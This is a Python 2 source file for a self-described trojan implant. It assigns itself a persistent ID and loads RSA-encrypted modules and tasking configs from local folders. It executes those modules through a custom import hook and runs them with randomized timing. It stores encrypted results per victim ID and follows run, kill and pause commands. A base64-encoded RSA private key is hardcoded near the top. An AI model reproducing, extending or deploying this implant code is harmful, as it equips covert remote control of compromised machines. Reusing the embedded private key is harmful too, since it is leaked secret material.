#!/usr/bin/python

import json
import sys
import time
import imp
import random
import threading
import Queue
import os
import base64
import lib_crypto as RSA

# -------- Configuration ---------- #
VERBOSE=False
DISABLE_WRITE_DATA = True

trojan_id = ""
trojan_config = "config/%s.json" % trojan_id
data_path = "data/%s/" % trojan_id

code_private_key=base64.b64decode("LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFb3dJQkFBS0NBUUVBNEJJKzJ4ekJxTEppdmR4MGk1em04NW8rczZ0Q3FVMDRzVjFkRG5La3NaWGdkYjNJCmhic0dSM0RRaDN6amZidTlkUHJlZ0k5aE5xNno1M3V2T1lUdS9TUlBRbGNKd0h1aldwQ1VJVUdQNGMzcWsvUjgKczJPZWdxMWpCem5DYXpyd1o1UXBNeUJmM1l1NGFZdzlGVXJxd3hrVzlrYzdqWGhVQjhlTUNLdHRrVWNDRWJISApkSUtrQksvNkx1UU9ySENuLzlnRk9PeW1SWVFkbGs1TURYeDl2RFRYaXFNVHVFOFNrN00yczhXS095c3JYMnlYClZGMFRRcmtCbmlic2xyc01GakpndXMyTTgrbGEzc3g2ekJERERsUUl4bnNVOUxlN1oySjRlSE1xekJmU1JjLzgKbDRMQVB0bFhRZzhKdTZPU3FpcFJ6VzRscG5xWWI2MGllR2FvcndJREFRQUJBb0lCQURSY3J5bWZEN1p2Y1ZteQo4ZDFLWGtJaEVuUUVHb0RiMWRyRTJhRXRzMFQ0cEVwL2ZpT2FMLzV6NDVjMTNTZWR2c2xlY3E2U1V3Sm5VdzFPClB3VnZCalpMek9YUTF5dU8rUDZKK01QSXdXbmdKK2hKWXZhODJlYnB3OUdGY3VTQ0VubnlDcXF5N3hRanVZV1kKeXhGMXYyUzJNVUorSlBHTFkvK3BaeFVEa29nM0lzVi8ySEJMSS9MWDNUWVVZd3prRkhwQ2VqR21Yc1NiT2plTgpDUVJ1UmVHcit2SGtPbmxBenNMRHJwNC9WWlpvZWJKRVY1REZIMzJBQUlqMDdrT0tZNGV4dHN6NW1tN0xXcGlnCk5BWVJFaGZ0SkxId3BHY0YvTmdBQnlNRTJ0UnU1eXY0YVNKRkdSckFaSkc0eHBDRDd4TkF0anBZU0hnZldybXgKcEdlc3RJa0NnWUVBNXNFVXVqTU0yQXA2T3RicGdjZzhDeDZ2a0o3aVl6MG1hVTEvUHluZVVwMTlpdFhXbUVRdAp4UkFkMkVtVDNYKytBc1VJQ1JDREpOYUljUGk4Q2I1cG1Gc3R0Ly8vUS8xemc0OCtVcnlQMlhEZmFFcmtua3N0CllRTFJKaUFudjAwblNHc0dPandoT2o0c1dwMzFCRFV1dWoxczFnZWtWS1JTWnBYRTVOOWM5UjBDZ1lFQStKWDkKWXBIcloycVhvaUFzQW45OTJzV1lQZmtQSG40Z3Rqb2xIQk5yY3E0NDJpdys3WmkvMVd0V29PMXlMdUpuL2VIWgovR0xEZ3VXdi9OMG9DVjNkZnBnbE1qaVZqK0ZyUEovazNjblpFWExQWFo1cTRWQktCRTY0ODhBVkI1MTNnZFZQCjk2S1JxSUdZV3JzL1BoWUpFZCtRUGpEMTRjaTk0c1RLQ0tkeDV6c0NnWUE4SVpoN0pRNTF4ZFV3UEF6QmF5SnEKYTJhb3N4NmZhYkgyd3VFajNvODJ6QitJN0V4dGhXYS84WUUxZVliMHMzTWFXYW5NWXVjcDFGWGR5cE9Gbm43NQoydGpCR0E2Mjh2Y0ZFM0RVTXByeHVMNGUrVlUyQXJVaWtJOWI5Z2tsaXI5djJhUFh6UStEayt3TytSWitNRFdyCkJwS3orMjNST0xqWVRyTHVTVjU1NlFLQmdRQyt1UVZoWFNkSmZ5Uzd4UWMvRzJZS05kUXFxQzRMYlNYWDZpQ1MKdSt1U1gwMUxSdXM1REJzU3VYb0xtbUlpeXA2UzBYZVlCb2FPcFg4eStOTkE3SDJHSldGVWVNbDNUTElrSDJGUApNUkNVTEl3Zy9leHUxbFVUblBxV09XZHBJazJRbFlMM01nbWpTVnNGTWVqQno5SkJuazlqQjlsKzA2K3NqdU9iClpDMG1CUUtCZ0Vpdm0vZDVPZkNpQ0JYU3VxRDAvS01WUUtIS3NJQWc3Zi8xeGdNNTh0bEJyeVQ5TTZvNkZxV1kKWHBsc0FqOFc2MkhIVmlYdWl0M3RPY1JxOTJEK1BISklKbEVBSlpHK1ZaNWpFSUlFSll6RWU3Mng4bTdEOUU4NQozTXVXZVJRNnVEWkFZVHZXbXlaMzNIL1lIaEVoZWx1NFFQaW9OdlI0RlhQSnR1d2pGS1VNCi0tLS0tRU5EIFJTQSBQUklWQVRFIEtFWS0tLS0t")

# -------- Variabels ---------- #
trojan_module = []
configured = False
config = None
task_queue = Queue.Queue()
data_public_key=""
code_public_key=""

class LocalImporter(object):
    def __init__(self):
        self.current_module_code=""
    
    def find_module(self, fullname, path=None):
        if configured:
            if VERBOSE: print "[*] Attemtping to retrieve %s" % fullname
            new_library = get_file_contents("modules/%s" % fullname)
            
            if new_library is not None:
                self.current_module_code = new_library
                return self
            else:
                if VERBOSE: print "[!] Failed to retrieve %s" % fullname
            return None
    
    def load_module(self, name):
        module = imp.new_module(name)
        exec self.current_module_code in module.__dict__
        sys.modules[name] = module
        print "[*] Load module %s" % name
        return module

def random_hex_string():
    hex_string = str(hex(random.randint(0x10000000,0xFFFFFFFF))).upper()[2:10]
    
    return hex_string

def get_file_contents(filepath):
    for parent, directories,filenames in os.walk("."):
        for filename in filenames:
            if filepath in os.path.join(parent,filename):
                if VERBOSE: print "[*] Found file %s" % os.path.join(parent,filename)
                with open(os.path.join(parent,filename)) as file_object:
                    content = RSA.decrypt(file_object.read(), code_private_key, VERBOSE)
                    file_object.close()
                return content
    return None

def get_trojan_config():
    global configured
    global config
    
    # Search for remote config file
    for file in os.listdir("config/"):
        if trojan_id in file:
            configured = True
    
    # If not found generate and save        
    if not configured:
        generate_trojan_config()
    
    # Load config file     
    config = json.loads(get_file_contents(trojan_config)) 
    print "[*] Found Config: %s" % trojan_config 
    configured = True
    
    for task in config:
        if 'module' in task:
            if task['module'] not in sys.modules:
                    exec ("import %s" % task['module'])
         
    return config

def check_trojan_id():
    global trojan_id
    global trojan_config
    global configured
    
    configured = False
    found_id = False
     
    # Check for ID file
    try:
         #Save ID from Sys.args
        trojan_id = sys.argv[1]
        trojan_id = sys.argv[1]
        save_id(trojan_id) 
    except:
        for file in os.listdir("."):
            if "id" in file:
                found_id = True
        
        if found_id:
            with open('id') as file_object:
                trojan_id = file_object.read().rstrip()
                trojan_config = "config/%s.json" % trojan_id
                print "[*] Found ID (%s)" % trojan_id
                file_object.close()
        else:
            # Generate and save ID
            trojan_id = random_hex_string()
            save_id(trojan_id)
    
    return trojan_id

def save_id(trojan_id):
    global trojan_config
    trojan_config = "config/%s.json" % trojan_id
    print "[*] Saving ID (%s)" % trojan_id
    with open('id', 'w') as file_object:
        file_object.write("%s" % trojan_id)
        file_object.close()
    return True
def generate_trojan_config():    
    # Generate default config file
    buffer = get_file_contents("config/default_config.json")
    print "[*] Generated configuration: %s" % trojan_config

    # Save config file in config folders
    with open(trojan_config, 'w') as file_object:
        file_object.write(RSA.encrypt_string(buffer,code_public_key, VERBOSE))
        file_object.close()
                  
    return True 

def store_module_result(data,module):
    global data_public_key
    if data is not None:
        data_public_key=get_file_contents("/config/data_key.pub")
        data = RSA.encrypt_string(data, data_public_key, VERBOSE)
        
        tm_year =  time.gmtime(time.time())[0]
        tm_mon =  time.gmtime(time.time())[1]
        tm_mday =  time.gmtime(time.time())[2]
        tm_hour =  time.gmtime(time.time())[3]
        tm_min =  time.gmtime(time.time())[4]
        tm_sec =  time.gmtime(time.time())[5]
        
        date = "%s-%s-%s_%s-%s-%s" % (tm_year, tm_mon, tm_mday, tm_hour, tm_min, tm_sec)
        
        remote_path = "data/%s/%s_%s.data" % (trojan_id, module, date)
        try:
            os.mkdir("data/%s" % trojan_id)
        except:
            pass
        
        with open(remote_path,'w') as file_object:
            print "Saving data as: %s" % remote_path
            file_object.write(data)
        
        return True
    return False
        
def module_runner(module, config):
    task_queue.put(1)
    result = sys.modules[module].run(trojan_id, config)
    task_queue.get()
    
    if not DISABLE_WRITE_DATA: store_module_result(result,module)
    
    return

# !------ Main Loop ------! #
sys.meta_path = [LocalImporter()]

while True:
    if task_queue.empty():
        code_public_key=get_file_contents("config/code_key.pub")
        # Check if Trojan has an unique ID    
        check_trojan_id()
        config = get_trojan_config()
        
        ## Task = Run
        if config[0]['task'] == 'run':
            for task in config:
                if 'module' in task:
                    t = threading.Thread(target=module_runner, args=(task['module'],task))
                    t.start()
                    time.sleep(random.randint(1,10))
                    
        ## Task = Kill
        if config[0]['task'] == 'kill':
            print "[!!!] Trojan kill itself"
            sys.exit(1)
         
        ## Task = Pause
        if config[0]['task'] == 'pause':
            print "[?] Trojan is in pause mode"
                    
    task_pause = random.randint(config[0]['task_pause_min'],config[0]['task_pause_max'])
    print "[*] Waiting for %s seconds" % task_pause
    time.sleep(task_pause)
